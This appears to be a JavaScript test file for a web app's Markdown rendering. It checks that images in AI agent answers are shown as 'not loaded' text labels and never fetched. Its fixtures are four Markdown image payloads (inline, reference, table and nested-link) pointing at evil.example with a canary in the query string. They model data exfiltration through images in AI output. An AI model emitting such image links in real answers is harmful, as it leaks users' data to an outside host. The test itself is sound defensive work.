import assert from "node:assert/strict"
import { mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join, resolve } from "node:path"
import test, { after } from "node:test"
import { fileURLToPath, pathToFileURL } from "node:url"
import { createElement } from "react"
import { renderToStaticMarkup } from "react-dom/server"
import TypeScript from "typescript"
import { imageAsText } from "./markdown-images.ts"

// The pages render components/agent-run-output.tsx and components/markdown.tsx.
// They are transpiled here (JSX and @/ paths, as lib/server/session-route.test.mjs
// does for routes) so a removed allowImages={false} or img override fails a test.
const root = fileURLToPath(new URL("../", import.meta.url))
const fixture = mkdtempSync(join(tmpdir(), "doops-markdown-images-test-"))
symlinkSync(join(root, "node_modules"), join(fixture, "node_modules"), "dir")
const compiled = new Map()
after(() => rmSync(fixture, { recursive: true, force: true }))

const compilerOptions = {
  module: TypeScript.ModuleKind.ESNext,
  target: TypeScript.ScriptTarget.ES2022,
  jsx: TypeScript.JsxEmit.ReactJSX,
}

function sourceModule(filename) {
  filename = resolve(filename)
  if (compiled.has(filename)) return compiled.get(filename)
  const output = join(fixture, `${compiled.size}.mjs`)
  const url = pathToFileURL(output).href
  compiled.set(filename, url)
  let javascript = TypeScript.transpile(readFileSync(filename, "utf8"), compilerOptions, filename)
  const parsed = TypeScript.createSourceFile(filename, javascript, TypeScript.ScriptTarget.ES2022, true, TypeScript.ScriptKind.JS)
  for (const statement of parsed.statements.filter((statement) =>
    (TypeScript.isImportDeclaration(statement) || TypeScript.isExportDeclaration(statement)) && statement.moduleSpecifier,
  ).reverse()) {
    const specifier = statement.moduleSpecifier
    const name = specifier.text
    if (!name.startsWith(".") && !name.startsWith("@/")) continue
    const source = name.startsWith("@/") ? join(root, name.slice(2)) : name
    const resolved = TypeScript.resolveModuleName(source, filename, {
      ...compilerOptions,
      moduleResolution: TypeScript.ModuleResolutionKind.Bundler,
      allowImportingTsExtensions: true,
    }, TypeScript.sys).resolvedModule
    assert.ok(resolved && resolved.resolvedFileName.startsWith(root) && /\.tsx?$/.test(resolved.resolvedFileName),
      `Missing DoOps TypeScript source: ${name} from ${filename}`)
    javascript = javascript.slice(0, specifier.getStart(parsed)) +
      JSON.stringify(sourceModule(resolved.resolvedFileName)) +
      javascript.slice(specifier.end)
  }
  writeFileSync(output, javascript)
  return url
}

const { AgentRunOutput } = await import(sourceModule(join(root, "components/agent-run-output.tsx")))
const { Markdown } = await import(sourceModule(join(root, "components/markdown.tsx")))

const CANARY = "doops-synthetic-canary-r41-7f2e"

const answers = [
  ["inline image", `结果如下 ![t](https://evil.example/p?d=${CANARY})`],
  ["reference image", `![x][r]\n\n[r]: https://evil.example/r?d=${CANARY}`],
  ["image in a table", `| a |\n| --- |\n| ![t](https://evil.example/t?d=${CANARY}) |`],
  ["image inside a link", `[![a](https://evil.example/i?d=${CANARY})](https://example.test)`],
]

function renderAnswer(answer) {
  return renderToStaticMarkup(createElement(AgentRunOutput, { run: { notes: [], trace: "", answer }, running: false, empty: "" }))
}

test("Given a DoSql or DoWeb answer with images, When the result area renders, Then nothing is fetched", () => {
  for (const [name, content] of answers) {
    const html = renderAnswer(content)
    assert.doesNotMatch(html, /<img\b/i, name)
    assert.doesNotMatch(html, /rel="preload"/i, name)
  }
  assert.match(renderAnswer(`![结果图](https://evil.example/p?d=${CANARY})`), /图片：结果图，未加载 https:\/\/evil\.example\/p/)
})

test("Given Markdown with allowImages false, When it renders, Then images are text", () => {
  for (const [name, content] of answers) {
    assert.doesNotMatch(renderToStaticMarkup(createElement(Markdown, { content, allowImages: false })), /<img\b/i, name)
  }
})

// The knowledge base uses the default and still shows images; this also proves the
// cases above would see an <img> if the override were dropped.
test("Given the default Markdown renderer, When an answer has an image, Then it is an <img>", () => {
  assert.match(renderToStaticMarkup(createElement(Markdown, { content: answers[0][1] })), /<img\b/)
})

test("Given an image without a source or alt text, When it renders as text, Then the label still says it was not loaded", () => {
  assert.match(renderToStaticMarkup(imageAsText({})), /\[图片，未加载\]/)
  assert.match(renderToStaticMarkup(imageAsText({ src: "  ", alt: "x" })), /\[图片：x，未加载\]/)
})
